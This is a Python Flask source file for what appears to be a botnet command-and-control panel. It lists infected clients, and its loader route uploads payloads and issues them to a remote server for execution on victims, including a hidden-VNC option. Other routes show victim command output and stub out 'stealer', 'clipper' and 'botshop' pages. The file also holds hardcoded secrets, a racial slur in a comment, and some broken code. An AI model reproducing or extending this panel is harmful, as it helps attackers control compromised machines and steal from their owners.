from flask import Flask, render_template, request, Response, make_response, redirect
import httpx
import json
from cryptography.hazmat.primitives import padding
import secrets
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import time
import magic


# Add pending commands list on individual client
# Fix individual not working
# Add authentication

def elapsed(start_timestamp, end_timestamp):
    # Calculate the absolute difference in seconds
    delta_seconds = abs(int(end_timestamp) - int(start_timestamp))

    def add0(intInput):
        intInput = str(intInput)
        if len(intInput) == 1:
            return " " + intInput
        else:
            return intInput

    if delta_seconds < 60:
        return f"{add0(delta_seconds)}s"
    elif delta_seconds < 3600:
        return f"{add0(delta_seconds // 60)}m"
    elif delta_seconds < 86400:
        return f"{add0(delta_seconds // 3600)}h"
    else:
        return f"{add0(delta_seconds // 86400)}d"


def convert_to_ago(timestamp):
    def add0(intInput):
        intInput = str(intInput)
        if len(intInput) == 1:
            return " " + intInput
        else:
            return intInput

    # Calculate the absolute difference in seconds
    delta_seconds = abs(int(time.time()) - int(timestamp))

    # Convert seconds to minutes, hours, or days
    if delta_seconds < 60:
        return f"{add0(delta_seconds)}s ago"
    elif delta_seconds < 3600:
        return f"{add0(delta_seconds // 60)}m ago"
    elif delta_seconds < 86400:
        return f"{add0(delta_seconds // 3600)}h ago"
    else:
        return f"{add0(delta_seconds // 86400)}d ago"

def convert_to_future(timestamp):
    def add0(intInput):
        intInput = str(intInput)
        if len(intInput) == 1:
            return " " + intInput
        else:
            return intInput
        
    delta = timestamp - int(time.time())

    if delta < 0:
        return "Expired"

    if delta <= 60 :
        return f"In {add0(int(delta))}s"
    elif delta <= 3600:
        return f"In {add0(int(delta // 60))}m"
    elif delta <= 86400:
        return f"In {add0(int(delta // 3600))}h"
    else:
        return f"In {add0(int(delta // 86400))}d"


SERVER_ADDRESS = "http://prod.kyun.li:80"
API_SECRET = "d92u10-trffy9-h33h93j-ndhnj9gf3-h12-"
HOST,PORT = "0.0.0.0", 1337
GUEST_KEY = "ea18b75e40fca7dc382d0c3cbde44979aedbee6fbe2a83074b729105b4e217a9cfb3def98e33fe91029e86d5f9299d50e809a10c756d593f880715030ffdb8df"
AUTH_KEY = "51d1f0286d6871d9907f5aedb5f6e3e08c9484e2aee662c9c8bc4b30fe62779550b8fc528271524d45c2a3ca9b0d43ba5609149c209444e028f5152d6cd2ebca"

app = Flask(__name__)


#    resp = make_response(render_template("clients.html", client_list=new_client_data, statistics=statistics))
#    resp.set_cookie('authtoken', 'I am cookie')
#    return resp 


@app.route("/portal/<key>")
def portal(key):

    if key == GUEST_KEY:
        return redirect(f"/guest/{GUEST_KEY}")

    elif key == AUTH_KEY:
        resp = make_response(redirect("/clients"))
        resp.set_cookie('authtoken', AUTH_KEY)
        return resp 
    else:
        return "no"

@app.route("/guest/<guest_key>")
def guest(guest_key):

    if guest_key != GUEST_KEY:
        return "nuh uh"
        
    c_time = time.time()
    client_list_response = httpx.post(SERVER_ADDRESS + "/api/clients_list", json={"api_secret": API_SECRET})
    client_list = json.loads(client_list_response.text)

    s_time = time.time()
    statistics_response = httpx.post(SERVER_ADDRESS + "/api/statistics", json={"api_secret": API_SECRET})
    statistics = json.loads(statistics_response.text)
    
    p_time = time.time()
    new_client_data = []
    for client_id, client_data in client_list.items():
        if not client_data["online"]:
            continue
        
        client_data["first_seen"] = client_data.get("last_seen", time.time())
        client_data["last_seen"] = convert_to_ago(client_data["last_seen"])
        
        if client_data["country"] == "-":
            client_data["country"] = "NL"

        client_data["client_id"] = client_id
        new_client_data.append(client_data)
    
    new_client_data.sort(key=lambda x: x["first_seen"])
    new_client_data = new_client_data[::-1]

    statistics["total_clients"] = f"{statistics['total_clients']:,}"
    statistics["online_clients"] = f"{statistics['online_clients']:,}"
    statistics["uac_clients"] = f"{statistics['uac_clients']:,}"

    if statistics["last_new_client"] == 0:
        statistics["last_new_client"] = "N/A"
    else:
        statistics["last_new_client"] = convert_to_ago(statistics["last_new_client"])

    print(f"Time for client_list: {time.time() - c_time}\nTime for stats request: {time.time() - s_time}\nTime for processing: {time.time() - p_time}\n")

    return render_template("guest.html", client_list=new_client_data, statistics=statistics)


@app.route("/clients")
def clients():

    if request.cookies.get('authtoken') != AUTH_KEY: return "no"

    c_time = time.time()
    client_list_response = httpx.post(SERVER_ADDRESS + "/api/clients_list", json={"api_secret": API_SECRET})
    print(client_list_response.content)
    client_list = json.loads(client_list_response.text)

    s_time = time.time()
    statistics_response = httpx.post(SERVER_ADDRESS + "/api/statistics", json={"api_secret": API_SECRET})
    statistics = json.loads(statistics_response.text)
    
    p_time = time.time()
    new_client_data = []
    for client_id, client_data in client_list.items():
        if not client_data["online"]:
            continue
        
        client_data["first_seen"] = client_data.get("last_seen", time.time())
        client_data["last_seen"] = convert_to_ago(client_data["last_seen"])
        
        if client_data["country"] == "-":
            client_data["country"] = "NL"

        client_data["client_id"] = client_id
        new_client_data.append(client_data)
    
    new_client_data.sort(key=lambda x: x["first_seen"])
    new_client_data = new_client_data[::-1]

    statistics["total_clients"] = f"{statistics['total_clients']:,}"
    statistics["online_clients"] = f"{statistics['online_clients']:,}"
    statistics["uac_clients"] = f"{statistics['uac_clients']:,}"

    if statistics["last_new_client"] == 0:
        statistics["last_new_client"] = "N/A"
    else:
        statistics["last_new_client"] = convert_to_ago(statistics["last_new_client"])

    print(f"Time for client_list: {time.time() - c_time}\nTime for stats request: {time.time() - s_time}\nTime for processing: {time.time() - p_time}\n")

    return render_template("clients.html", client_list=new_client_data, statistics=statistics)

@app.route("/builder")
def builder():

    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
    return render_template("builder.html")

@app.route("/loader", methods=['GET', 'POST', 'DELETE'])
def loader():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"

    if request.method == "POST":

        file = request.files['payload']

        execution_type = request.form.get('execution_type').split("|")[1][1:]
        payload = base64.b64encode(file.read()).decode("utf-8")
    
        if request.form.get('amount') == '':
            amount = "999999999"
        else:
            amount = request.form.get('amount')

        if request.form.get("is_recursive") != None:
            is_recursive = True
        else:
            is_recursive = False

        note = file.filename + " | " + request.form.get("note")

        if execution_type == "Rustdesk HVNC":
            payload = base64.b64decode(open("rustdesk_client.exe"))

        load_creation_response = httpx.post(SERVER_ADDRESS + "/api/issue_load", 
            json={
                "api_secret": API_SECRET,
                "cmd_type": execution_type,
                "cmd_args": [payload, request.form.get("argument"), request.form.get("argument1"), request.form.get("argument2")], # nigga here 
                "amount": int(amount),
                "note": note,
                "is_recursive": is_recursive
            },
            timeout=None
        )

        print(f"{load_creation_response.content}")

    load_id = request.args.get('delete_load')
    if load_id != None:

        httpx.post(SERVER_ADDRESS + "/api/remove_load", 
            json={"api_secret": API_SECRET, "load_id": load_id}
        )

    load_list_response = httpx.post(SERVER_ADDRESS + "/api/loads_list", json={"api_secret": API_SECRET})
    load_list = json.loads(load_list_response.text)

    new_load_data = []
    
    for load_id, load in load_list.items():

        if load['cmd_args'].startswith("storage:"):\
            cmd_args = f"Args are too long to be displayed. View them raw here: http://{HOST}:{PORT}/view/{load['cmd_args'].split("storage:")[1]}"
        else:
            cmd_args = data['cmd_args']

        load["percent_completed"] = int(100 * float(load["completed_amount"]) / float(load["required_amount"]))
        load["load_id"] = load_id
        load["time_issued"] = convert_to_ago(load["time_issued"])
        load["cmd_args"] = cmd_args
        new_load_data.append(load)

    return render_template("loader.html", load_list=new_load_data)

@app.route("/firewall")
def firewall():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"

    block_id = request.args.get('delete_block')
    if block_id != None:

        httpx.post(SERVER_ADDRESS + "/api/remove_block", 
            json={"api_secret": API_SECRET, "block_id": block_id}
        )

    blocks_list_response = httpx.post(SERVER_ADDRESS + "/api/blocks_list", json={"api_secret": API_SECRET})
    blocks_list = json.loads(blocks_list_response.text)

    new_blocks_list = []
    for block_id, block in blocks_list.items():

        block["block_id"] = block_id
        if block["banned_until"] == 0:
            block["banned_until"] = "Never"
        else: 
            convert_to_future(block["banned_until"])
        new_blocks_list.append(block)


    return render_template("firewall.html", block_list=new_blocks_list)

@app.route("/server_logs")
def server_logs():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"

    response = httpx.post(SERVER_ADDRESS + "/api/outputs_list", 
        json={"api_secret": API_SECRET}
    )

    new_outputs_list = []

    for output_id, data in json.loads(response.text).items():

        if data['output'].startswith("storage:"):\
            output = f"Output too long to be displayed. View it raw here: http://{HOST}:{PORT}/view/{data['output'].split("storage:")[1]}"
        else:
            output = data['output']
            
        new_outputs_list.append({
            "cmd_type": data['cmd_type'],
            "time_to_complete": f'{elapsed(data['time_recieved'], data['time_issued'])}',
            "client_id": data['client_id'],
            "output": output,
            "time_recieved": data['time_recieved']
        })            

    new_outputs_list.sort(key=lambda x: x["time_recieved"], reverse=True)
    return render_template("server_logs.html", new_outputs_list=new_outputs_list)

@app.route("/individual", methods=['GET', 'POST'])
def individual():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"

    response = httpx.post(SERVER_ADDRESS + "/api/get_output", 
        json={
            "api_secret": API_SECRET,
            "client_id": request.args.get('client_id')
        }
    )

    new_outputs_list = []
    recv_list = list(json.loads(response.text).items())
    recv_list.sort(key=lambda x: x[1]["time_recieved"], reverse=True)
    for output_id, data in recv_list:
        if data['output'].startswith("storage:"):
            output = f"Too long to display. View: http://{HOST}:{PORT}/view/{data['output'].split('storage:')[1]}"
        else:
            output = data['output']

        if data['cmd_args'].startswith("storage:"):
            cmd_args = f"Too long to display. View: http://{HOST}:{PORT}/view/{data['cmd_args'].split('storage:')[1]}"
        else:
            cmd_args = data['cmd_args']
            
        new_outputs_list.append({
            "cmd_type": data['cmd_type'],
            "cmd_args": cmd_args,
            "time_to_complete": f'{data["time_recieved"] - data["time_issued"]}s',
            "client_id": data['client_id'],
            "output": output,
            "time_recieved": convert_to_ago(data['time_recieved'])
        })

    return render_template("individual.html", new_outputs_list=new_outputs_list)

@app.route("/view/<storage_id>")
def view(storage_id):
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"

    response = httpx.post(SERVER_ADDRESS + "/api/parse_storage", 
        json={
            "api_secret": API_SECRET,
            "storage_id": storage_id
        }
    )

    mime = magic.from_buffer(response.content, mime=True)
    if mime.startswith('image'):
        return Response(response.content, content_type='image/png', cookies={"example": "cookie_value"})
    else:
        return Response(response.content, content_type='text/plain')

@app.route("/settings")
def settings():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
    return redirect("/clients")            

@app.route("/clipper")
def clipper():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
    return redirect("/clients")
    
@app.route("/botshop")
def botshop():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
    return redirect("/clients")

@app.route("/stealer")
def stealer():
    if request.cookies.get('authtoken') != AUTH_KEY: return "no"
    return redirect("/stealer")


app.run(HOST,PORT)
